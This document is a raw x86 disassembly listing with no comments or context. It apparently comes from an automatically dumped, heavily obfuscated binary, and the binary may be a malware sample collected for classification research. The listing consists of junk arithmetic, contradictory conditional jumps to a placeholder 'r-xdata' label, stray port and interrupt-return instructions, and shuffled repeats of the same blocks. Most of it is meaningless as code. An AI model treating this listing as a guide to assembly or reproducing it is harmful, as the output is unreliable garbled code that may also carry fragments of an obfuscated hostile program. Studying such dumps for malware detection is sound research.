pop ecx
or eax 0xf04c483
mov ebp ebp
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
jae r-xdata
pop ecx
jno r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
pop edx
jg r-xdata
jpo 0xf70a768
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
je 0xffffffffa3a4d441
jg r-xdata
jg 0xffffffff9c948276
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44f2a2
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
ja r-xdata
and ecx 0xf681ad79
jns r-xdata
jmp 0xcab7ab
call sub_402f2b
xor edi 0x517f5859
jno 0xfffffffff2c189e8
push ecx
push ebx
call sub_402e7b
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
push esi
push esi
call sub_402f76
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd886d
push edx
call sub_402eac
or edi 0x830f5858
jne r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jno 0x16401c45
jae r-xdata
je 0xffffffff814fd041
jne r-xdata
jno 0xffffffff834f866f
xor edx 0x81257159
r-xdata
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac1379b
sub_402e8b
pop eax
pop edx
pop eax
jae r-xdata
pop edx
pop eax
jae r-xdata
or eax 0xff6d830f
pop eax
pop ecx
jge r-xdata
jne 0xf44f2a2
pop ecx
or eax 0xf04c483
mov ebp ebp
add [ eax + eax - 0x7af10000 ] 0xea810971
jg r-xdata
jne 0x24c13ecb
jno r-xdata
push ebp
call sub_402e00
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jne r-xdata
and eax 0x8b0f327f
jae r-xdata
sub ecx 0xe1813e75
pushfd
call sub_402deb
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_402e8b
ja 0x504b292
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jns r-xdata
jge 0xffffffffb8afae02
jae r-xdata
pop ecx
jno r-xdata
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
ja r-xdata
and ecx 0xf681ad79
jns r-xdata
jmp 0xcab7ab
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
jno 0x16401c45
pop edx
jg r-xdata
jpo 0xf70a768
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jns r-xdata
xor edx 0x81257159
r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
jae r-xdata
je 0xffffffff814fd041
jne r-xdata
jno 0xffffffff834f866f
jg r-xdata
jg 0xffffffff9c948276
ja r-xdata
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac1379b
push esi
push esi
call sub_402f76
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd886d
push edx
call sub_402eac
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jns r-xdata
jae r-xdata
je 0xffffffffa3a4d441
call sub_402f2b
xor edi 0x517f5859
jno 0xfffffffff2c189e8
push ecx
push ebx
call sub_402e7b
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
sub_402eac
jg r-xdata
pop eax
add esp 0x4
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
pop ecx
jno r-xdata
jno 0x16401c45
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcab7ab
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jns r-xdata
xor edx 0x81257159
r-xdata
pop edx
jg r-xdata
jpo 0xf70a768
jae r-xdata
sub eax 0x4d795a58
jae r-xdata
je 0xffffffff814fd041
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44f2a2
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
jg 0xffffffff9c948276
ja r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
push esi
push esi
call sub_402f76
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd886d
push edx
call sub_402eac
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jne r-xdata
jno 0xffffffff834f866f
push ebp
call sub_402e00
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4d441
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac1379b
jg r-xdata
jne 0x24c13ecb
jae r-xdata
sub ecx 0xe1813e75
call sub_402f2b
xor edi 0x517f5859
jno 0xfffffffff2c189e8
push ecx
push ebx
call sub_402e7b
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8afae02
pushfd
call sub_402deb
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_402e8b
ja 0x504b292
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jno r-xdata
pop ecx
jae r-xdata
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub_402ef7
pop eax
pop ecx
pop ecx
jae r-xdata
pop eax
pop eax
jae r-xdata
or edx 0xff50830f
pop ecx
pop eax
jg r-xdata
mov ebx 0x8f0f6975
pop edx
jne r-xdata
jno 0xfffffffff2c189e8
push ecx
push ebx
call sub_402e7b
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
pushfd
push ebx
push esp
pushfd
add esi 0xf337d58
test [ edi - 0x5b ] bh
pop ecx
jno r-xdata
jno 0x16401c45
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jns r-xdata
jmp 0xcab7ab
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
pop edx
jg r-xdata
jpo 0xf70a768
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jae r-xdata
sub eax 0x4d795a58
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44f2a2
jns r-xdata
xor edx 0x81257159
r-xdata
call sub_402f2b
xor edi 0x517f5859
push edi
push ebp
push ecx
and ecx 0xff378f0f
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
jae r-xdata
je 0xffffffff814fd041
jne r-xdata
jno 0xffffffff834f866f
push ebp
call sub_402e00
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jg r-xdata
jg 0xffffffff9c948276
ja r-xdata
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac1379b
jg r-xdata
jne 0x24c13ecb
jae r-xdata
sub ecx 0xe1813e75
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd886d
push edx
call sub_402eac
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8afae02
pushfd
call sub_402deb
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_402e8b
ja 0x504b292
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4d441
jno r-xdata
pop ecx
jae r-xdata
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
push esi
push esi
call sub_402f76
sub ebx 0xfeace855
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
sub_402f2b
pushfd
jae r-xdata
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
pop ecx
jno r-xdata
jno 0x16401c45
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcab7ab
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jns r-xdata
xor edx 0x81257159
r-xdata
pop edx
jg r-xdata
jpo 0xf70a768
jae r-xdata
sub eax 0x4d795a58
jae r-xdata
je 0xffffffff814fd041
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44f2a2
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
jg 0xffffffff9c948276
ja r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
push esi
push esi
call sub_402f76
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd886d
push edx
call sub_402eac
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jne r-xdata
jno 0xffffffff834f866f
push ebp
call sub_402e00
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4d441
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac1379b
jg r-xdata
jne 0x24c13ecb
jae r-xdata
sub ecx 0xe1813e75
call sub_402f2b
xor edi 0x517f5859
jno 0xfffffffff2c189e8
push ecx
push ebx
call sub_402e7b
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8afae02
push edi
push eax
push edx
call sub_402e8b
ja 0x504b292
pushfd
call sub_402deb
mov eax [ fs : 0xffffffff9ce8c173 ]
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jno r-xdata
pop ecx
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
sub_402f76
sub [ esp + 0x40 ] r-xdata
sub esp 0x10
pop edx
ja r-xdata
jg r-xdata
jmp [ 0xce8d0f ]
jge r-xdata
jmp 0xffffffff844f612c
jno r-xdata
sub esi 0x73bd047f
push ebp
ja r-xdata
jmp [ 0xfffffffff381df77 ]
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1ee5b
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
ja r-xdata
call 0xffca96a
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1af95
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a46d31
jge r-xdata
call [ 0xffffffffca81677d ]
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
pop edx
pop edx
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b7cc
ja r-xdata
jge 0x71fc6fd3
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
push ebp
pushfd
call sub_4030d4
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jno r-xdata
mov ebx 0xf04c483
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jne r-xdata
or edx 0xf3812e79
pushfd
push esi
call sub_4030cb
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_4031e5
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
pop eax
jge r-xdata
jge 0xffffffffffa2b380
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jno r-xdata
sub esi 0x89641f79
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc16eba
jae r-xdata
add edx 0xff108f0f
pop ecx
jns r-xdata
jno 0xffffffff874f6633
jne r-xdata
sub edi 0x64244481
jno r-xdata
add esp 0x4
ja r-xdata
jl 0xffffffffffacc0f8
jae r-xdata
ja 0xffffffffa3c34090
push ecx
push edx
push ebp
sub esp 0x4
call sub_403097
xor ebx 0x15ff4e7f
mov edx 0xff47830f
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
ja r-xdata
pop edx
mov eax 0xff55870f
jg r-xdata
jpo 0xdeb676
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
inc eax
add [ ebx + 0x5a5928ec ] al
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
ja r-xdata
xor ebx 0xff3d870f
call sub_403047
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
jmp 0xffffffffff79b18e
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93aee
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
push edx
push esp
push edx
call sub_4030f7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jg r-xdata
add eax 0x5abb2979
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f6aa
jg r-xdata
ja 0xcab4a6
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f5b0
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bb34d
pop edx
jge r-xdata
jo 0xffffffff854f8b9f
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f665
add [ eax ] al
dec ecx
pop ecx
jno r-xdata
call 0xf44f8d9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jae r-xdata
call sub_40325c
jb 0xffffffff81b2af12
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa6c0
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
jne r-xdata
jbe 0xffd03a4
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jge 0xffffffffffa0b6e3
add esp 0x4
jae r-xdata
jl 0xf3b428
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_403102
jae 0xffffffffff43b927
xor ecx 0x890fd079
or esi 0xff24810f
jge r-xdata
jpe 0x74cd42e7
pop eax
jg r-xdata
jge 0xffffffff894f8b21
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
and eax 0x4c48358
ja r-xdata
jno 0xffffffffe89185be
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158b682
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jno r-xdata
jae 0xffffffff8428ab9d
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
je 0xffffffffff6db76f
jge r-xdata
les ecx [ eax ]
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_403047
pop ecx
pop edx
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jae r-xdata
add edx 0xff108f0f
pop edx
mov eax 0xff55870f
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1ee5b
ja r-xdata
call 0xffca96a
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a46d31
jg r-xdata
and ebx 0xff5a870f
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop edx
pop edx
jae r-xdata
jne r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
ja r-xdata
jg r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
jae r-xdata
ja r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
pushfd
push esi
call sub_4030cb
sub ebx 0xa48f0f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
ja r-xdata
jge 0x71fc6fd3
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1af95
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b7cc
add [ eax ] al
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jno r-xdata
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_4031e5
add esi 0xa6830f
add [ eax ] al
mov ebx 0xf04c483
jae r-xdata
ja 0xffffffffa3c34090
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
pop eax
ja r-xdata
xor edx 0x880f5e7f
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
push ecx
push edx
push ebp
sub esp 0x4
call sub_403097
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jne r-xdata
sub edi 0x64244481
jno r-xdata
add esp 0x4
ja r-xdata
jl 0xffffffffffacc0f8
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
push ebp
pushfd
call sub_4030d4
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jne r-xdata
or edx 0xf3812e79
jg r-xdata
jpo 0xdeb676
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
inc eax
add [ ebx + 0x5a5928ec ] al
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
pop eax
jge r-xdata
jge 0xffffffffffa2b380
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc16eba
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jg r-xdata
ja 0xffffffffff9bb34d
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f5b0
lea eax [ ecx + 0x1 ]
add [ eax ] al
pop ecx
jns r-xdata
jno 0xffffffff874f6633
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93aee
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
push edx
push esp
push edx
call sub_4030f7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jno r-xdata
and ebx 0x870f4975
jae r-xdata
call sub_40325c
jb 0xffffffff81b2af12
or edx 0x54549c55
ja r-xdata
xor ebx 0xff3d870f
call sub_403047
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f6aa
jg r-xdata
ja 0xcab4a6
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
jmp 0xffffffffff79b18e
pop edx
jge r-xdata
jo 0xffffffff854f8b9f
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f665
add [ eax ] al
dec ecx
pop ecx
jno r-xdata
call 0xf44f8d9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
add esp 0x4
jae r-xdata
jl 0xf3b428
jg r-xdata
add eax 0x5abb2979
pop edx
jg r-xdata
